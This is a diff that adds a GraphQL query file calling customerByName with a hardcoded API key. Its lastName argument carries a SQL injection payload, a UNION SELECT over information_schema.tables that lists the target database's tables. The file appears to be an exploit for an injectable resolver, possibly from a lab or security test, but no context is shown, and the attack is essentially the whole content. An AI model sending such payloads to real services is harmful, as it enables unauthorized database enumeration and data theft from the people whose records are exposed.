@@ -1,0 +1,12 @@
+query {
+  customerByName(
+    apiKey: "0711a879ed751e63330a78a4b195bbad",
+    lastName: "x' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -"
+  ) {
+    id
+    firstName
+    lastName
+    address
+  }
+}
+
